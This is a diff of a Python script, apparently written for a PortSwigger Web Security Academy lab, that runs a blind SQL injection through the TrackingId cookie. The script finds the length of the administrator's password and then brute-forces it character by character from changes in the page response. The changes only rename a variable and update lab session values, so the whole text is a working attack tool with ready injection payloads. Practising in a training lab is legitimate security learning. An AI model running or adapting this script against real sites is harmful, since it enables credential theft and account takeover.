@@ -8,18 +8,18 @@ import requests
 import string
 
 #Replace this Section with your URL and Cookies
-Cquery = "1UD2ou412FxzwwoT"
-SessionToken = 'm3wHlyH6OYEiuq8f1aOBLhWLb5C4H2qI'
-url = 'https://aca11f2c1ed55af7801b4f04003700a5.web-security-academy.net/'
+TrackingID_value = "G46uQ6P8XZ4lPK2P" 
+SessionToken = 'iZrs9VZpetYK7B8XfJyF9LeNPBy82a14'
+url = 'https://ac701fc11e04e2f68062339100f200c2.web-security-academy.net/'
 
 
 #Single Queary Requests. 
 def basic_q(q):
 	
 	Mquery = q
-	cookiesStuff = {'TrackingId':Cquery+Mquery,'session':SessionToken}
+	cookiesStuff = {'TrackingId':TrackingID_value+Mquery,'session':SessionToken}
 	r = requests.get(url,cookies=cookiesStuff)
-	print(Cquery+Mquery)
+	print(TrackingID_value+Mquery)
 	print(r.text.find('Welcome'))
 
 
@@ -28,10 +28,11 @@ def passwordLength():
 	for x in range (0,40):
 		
 		Mquery = f"""' AND (SELECT 'a' FROM users WHERE username='administrator' and Length(password)={x} )='a"""
-		cookiesStuff = {'TrackingId':Cquery+Mquery,'session':SessionToken}
+		cookiesStuff = {'TrackingId':TrackingID_value+Mquery,'session':SessionToken}
 		r = requests.get(url,cookies=cookiesStuff)
 		print(r.text.find('Welcome'), "Testing " , x)
 		print(r.status_code)
+		
 		
 		
 def split(word): 
@@ -39,13 +40,14 @@ def split(word):
 
 def passwordbrute():
 	char = split(string.printable)
+
 	
 	Found_password = ""
 	
 	for x in range(1,21):
 		for y in char:
 			Mquery = f"""' AND (SELECT SUBSTRING(password,1,{x}) from users WHERE username='administrator')='{Found_password}{y}' --"""
-			cookiesStuff = 		{'TrackingId':Cquery+Mquery,'session':SessionToken}
+			cookiesStuff = 		{'TrackingId':TrackingID_value+Mquery,'session':SessionToken}
 			r = requests.get(url,cookies=cookiesStuff)
 			print(str(r.text.find('Welcome')) + " --- StatusCode:" + str(r.status_code))
 			print(Mquery)
@@ -55,6 +57,6 @@ def passwordbrute():
 				print(f"\r\nCharacter Found: {y} ({x}/20 Characters Found). Current Password is: {Found_password}\r\n")
 				break
 		
-		
+
 passwordbrute()
 
